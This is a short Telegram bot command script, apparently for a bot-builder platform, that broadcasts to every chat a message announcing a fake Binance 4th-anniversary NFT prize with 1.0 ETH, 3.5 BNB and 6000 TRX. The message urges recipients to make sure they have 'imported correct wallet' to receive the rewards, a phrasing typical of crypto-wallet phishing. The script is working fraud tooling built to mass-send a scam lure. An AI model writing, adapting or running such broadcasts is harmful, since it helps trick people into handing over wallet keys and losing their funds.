/*CMD
  command: /upd
  help: 
  need_reply: 
  auto_retry_time: 
  folder: 
  answer: 
  keyboard: 
  aliases: 
CMD*/

var txt = '🎉 Congratulations 🎉 \n\n💎 You are Lucky Winner of 1 limited edition Binance 4th anniversary NFT! \n\n💎 As Well with 1 NFT, you get:\n💰 1.0 ETH\n💰 3.5 BNB\n💰 6000 TRX\n\n\n🔖 Please make sure you have imported correct wallet or you will not be able to receive Rewards🔖';
Bot.runAll({ 
command: '/broadcast',
for_chats: "all",
options: {msg: txt}
})
